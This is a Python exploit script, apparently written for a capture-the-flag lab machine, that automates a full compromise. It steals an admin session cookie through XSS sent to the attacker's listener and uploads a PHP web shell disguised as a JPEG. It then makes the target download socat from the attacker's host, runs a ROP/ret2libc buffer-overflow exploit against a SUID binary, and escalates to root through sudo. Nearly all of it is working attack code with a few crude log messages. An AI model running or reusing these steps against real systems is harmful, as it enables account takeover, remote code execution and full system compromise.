#!/usr/bin/env python

import os
import re
import sys
import time
import fcntl
import struct
import requests
import random
import subprocess

from shutil import copyfile
from string import letters as chars
from urllib import quote
from pwn import *


class networking:

	@staticmethod
	def checkipaddress(address):
		try:
			socket.inet_aton(address)
			return True
		except socket.error:
			return False

	@staticmethod
	def checkport(port):
		try:
		    s = socket.socket()
		    s.connect((rhost, port))
		    s.close()
		    return True
		except socket.error:
			return False
	@staticmethod
	def getipaddress(ifname):
		try:
		    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		    return socket.inet_ntoa(fcntl.ioctl(
			    s.fileno(),
			    0x8915,  # SIOCGIFADDR
			    struct.pack('256s', ifname[:15])
		    )[20:24])
		except IOError:
			return False


class http:
	@staticmethod
	def getparameters(url):
		try:
		    valid = []
		    response = requests.get(url, headers=config.headers)
		    hrefs = re.findall('href="(.*?)"', response.text)
		    for href in hrefs:
		    	if href.endswith("php") or 'id=' in href:
		    		valid.append(href[1:])
		    return valid
		except:
			return False
	@staticmethod
	def testsqlinjection(url):
		try:
			temp = url + (" AND 1=1")
			first = requests.get(temp, headers=config.headers)

			temp = url + (" AND 1=0")
			second = requests.get(temp, headers=config.headers)
			if len(first.text) == len(second.text):
				return False
			return True

		except:
			return False
	@staticmethod
	def testxss(url, lurl):
		try:

			params = {
			    "feedback": "test",
			    "url":lurl,
			    "description":"test"
			}
			response = requests.post(url, data=params, headers=config.headers)
			return True
		except Exception as error:
			return False

	@staticmethod
	def testadmincookie(url, cookies):
		try:
			first = requests.get(url, headers=config.headers)
			second = requests.get(url, headers=config.headers, cookies=cookies)
			if len(first.text) == len(second.text):
				return False
			return True
		except:
			return False
	@staticmethod
	def testfileupload(url,cookies, payload, filename):
		with open(filename, "wb") as f:
			f.write(config.magicbytes + payload)
		files = {"image":open(filename,"rb")}
		params = {"Referer":"http://192.168.1.232/admin.php", "submit":"Upload"}
		try:
			response = requests.post(url, cookies=cookies, data=params, files=files, headers=config.headers)
			if "uploaded" in response.text:
				return True
			return False				
		except:
			return False
	@staticmethod
	def testcodeexecution(url, filename, command):
		try:
			temp = url + "/img/" + filename + "?cmd=" + command
			response = requests.get(temp)
			if response.status_code == 200:
				return "".join(list(response.text)[12:]).strip().encode("utf-8")
			return False
		except:
			return False


class config:
	def __init__(self, rhost, lhost):
		self.rhost = rhost
		self.lhost = lhost
		self.url = "http://" + rhost
		self.ports = [21,22,80]

		self.headers = {
		    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"

		}

		self.sockettimeout = 120 # seconds
		socket.setdefaulttimeout(self.sockettimeout)

		self.magicbytes = "\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01" # JPEG
		self.backdoor = '<?php system($_REQUEST["cmd"]); ?>'

def helpuser():
	log.failure("{} <rhost> <lhost or interface>".format(sys.argv[0]))
	sys.exit()

if __name__ == "__main__":
	if len(sys.argv) != 3:
		helpuser()
	rhost = sys.argv[1]
	lhost = sys.argv[2]
	if networking.checkipaddress(lhost):
		pass
	elif networking.getipaddress(lhost):
		lhost = networking.getipaddress(lhost)
	else:
		helpuser()

	if os.path.exists("./socat"):
		socatlocation = "./socat"
	elif os.path.exists("/usr/bin/socat"):
		socatlocation = "/usr/bin/socat"
	else:
		log.info("socat should be in . or /usr/bin/")
		log.failure("something went wrong!")
		sys.exit()


	config = config(rhost,lhost)

	log.info("target {} selected...".format(rhost))
	print
	for port in config.ports:
		if networking.checkport(port):
			log.success("port {} seems to be open!".format(port))
		else:
			log.failure("port {} seeems to be close: something went wrong!".format(port))
			sys.exit()

	## first step: parse html to find parameters
	print
	log.info("going to parse port 80...")
	hrefs = http.getparameters(config.url)
	for href in hrefs:
		url = config.url + href
		response = requests.get(url, headers=config.headers)
		if response.status_code == 200:
			log.success("got {} [200]".format(config.url + href))
		else:
			log.failure("got {} [{}]".format(config.url + href, response.status_code))
	
	print
	log.info("going to test SQLi and XSS vulnerabilities...")
	print
	url = config.url + hrefs[-1]
	log.info("testing SQLi at {}".format(url))
	if http.testsqlinjection(url):
		log.success("SQL injection seems to be there: maybe can you contribute to this script?")
	else:
		log.failure("something went wrong!")
		sys.exit()

	url = config.url + hrefs[2]
	random_port = random.randint(1025, 65535)
	lurl = "http://" + config.lhost + ":" + str(random_port)
	print
	log.info("testing XSS to steal cookies at {}".format(url))

	## deliver xss payload and fireup a python server with some timeout
	
	log.info("going to deliver xss payload...")
	if http.testxss(url,lurl):
		log.info("going to setup a socket server for 120 seconds [{}:{}]".format(config.lhost, random_port))
		s = socket.socket()
		s.bind((lhost, random_port))
		s.listen(1)
		try:
		    client, address = s.accept()
		except socket.timeout:
			log.failure("something went wrong!")
			sys.exit()

		log.success("request received from {}:{}...".format(address[0],address[1]))
		request = client.recv(1024).strip().split("\n")[-1]
		client.close()
		s.close()
		cookie = request.split("=")[-1].strip()
		log.success("admin's PHPSESSID fucked {}".format(cookie))

	else:
		log.failure("something went wrong!")
		sys.exit()
	print
	## once fucked you have to upload a malicious image

	cookies = {
	    "PHPSESSID": cookie
	}

	url = config.url + hrefs[3]

	if http.testadmincookie(url, cookies):
		log.success("login as admin works, trying to upload malicious image...")
	else:
		log.failure("something went wrong!")

	filename = ""
	for i in range(0, 10):
		filename += random.choice(chars)
	filename += ".php"

	log.success("malicious file has been created...")
	log.info("going to upload {}...".format(filename))
	if http.testfileupload(url, cookies, config.backdoor, filename):
		log.success("file uploaded!")
	else:
		log.failure("something went wrong!")
		sys.exit()

	log.info("testing code execution...")
	junk = "A" * 30
	response = http.testcodeexecution(config.url, filename, "echo {}".format(junk))
	if response and junk in response:
		whoami = http.testcodeexecution(config.url,filename, "whoami")
		if whoami:
		    log.success("the exploit is working: whoami? {}".format(whoami))
		else:
			log.failure("something went wrong!")
			sys.exit()
	else:
		log.failure("something went wrong!")
		sys.exit()
	backdoor = filename
	print
	# enumeration: find SUID files and exploit one of them
	log.info("going to enumerate SUID files, this could take a while...")
	command = "find / -perm -4000 -type f 2>/dev/null"
	files = http.testcodeexecution(config.url, backdoor, command)
	if files:
		binaryfile = files.split("\n")[-1]
	else:
		log.failure("something went wrong!")
		sys.exit()



	permissions = http.testcodeexecution(config.url, backdoor, "ls -l {}".format(binaryfile))
	if permissions:
		log.success("found {}".format(permissions))
	else:
		log.failure("something went wrong!")
		sys.exit()

	print

	## upload socat and launch that to expose /sbin/notemaker then pwntools!
	log.info("going to exploit {}...".format(binaryfile))

	## copy socat here -> fireup python -m -> call wget -> chmod +x -> subprocess + request to fireup socat then exploit.py
	files = os.listdir(os.getcwd())
	if not socatlocation.split("/")[-1] in files:
		copyfile(socatlocation, os.getcwd() + "/socat")
		socatlocation = os.getcwd() + "/socat"

	null = open(os.devnull, "w")

	random_port = str(random.randint(1025, 65535))
	log.info("going to fire up a python simpleserver [{}:{}]".format(config.lhost, random_port))
	log.info("uploading socat and setting permissions to expose {}...".format(binaryfile))

	process = subprocess.Popen('python -m SimpleHTTPServer {} 2> /dev/null'.format(random_port), shell=True, stdout=null)
	http.testcodeexecution(config.url, backdoor, "wget http://{}:{}/socat -O socat".format(config.lhost, random_port))
	time.sleep(10)
	process.kill()

	# try to set permissions and check if file exists and is properly executable
	http.testcodeexecution(config.url, backdoor, "chmod 777 /var/www/html/img/socat")
	socat_permissions = http.testcodeexecution(config.url, backdoor, "ls -l socat")
	if socat_permissions:
		log.success("file uploaded with success: {}".format(socat_permissions))
	else:
		log.failure("something went wrong!")
		sys.exit()

	random_port = str(random.randint(1025, 65535))
	log.info("trying to expose {} on port {}...".format(binaryfile, random_port))
	command = './socat TCP-LISTEN:{},reuseaddr,fork EXEC:"{}"'.format(random_port, binaryfile)
	try:
		requests.get(config.url + "/img/" + backdoor + "?cmd=" + command, timeout=3)
	except requests.exceptions.ReadTimeout:
		pass

	try:
	    s = socket.socket()
	    s.connect((config.rhost, int(random_port)))
	    s.close()
	except:
		log.failure("something went wrong!")
		sys.exit()
	log.success("{} exposed with success!".format(binaryfile))
	print

	pop_rdi = p64(0x4014eb)
	puts_plt = p64(0x401050)
	puts_got = p64(0x404028)
	main_plt = p64(0x401370)
	junk = "A" * 280
	io = remote(config.rhost, (random_port))
	io.recv()
	io.clean()
	payload = junk + pop_rdi + puts_got + puts_plt + main_plt
	io.sendline(payload)
	recv = io.recv()
	puts_leak = u64(recv.split("\n")[0].strip().ljust(8, "\x00"))
	libc_base_address = (puts_leak - 0x809c0)
	onegadget = p64(libc_base_address + 0x4f322)
	log.success("puts@leaked: {}".format(hex(puts_leak)))
	log.success("libc_base_address: {}".format(hex((libc_base_address))))
	log.success("one gadget address: {}".format(hex(u64(onegadget))))
	payload = junk + onegadget
	io.clean()
	io.sendline(payload)
	io.sendline("whoami")
	log.success("whoami? {}".format(io.recv().strip()))

	io.sendline("sudo -l")
	sudo = io.recv().strip().split("\n")[-1].strip()
	log.success("{}".format(sudo))
	print
	log.info("trying privesc via sudo -l technique")
	io.sendline("sudo service ../../bin/sh")

	io.sendline("whoami")

	log.success("got root? {}".format(io.recv().strip()))

	log.success("popping shell...")
	io.interactive()

	

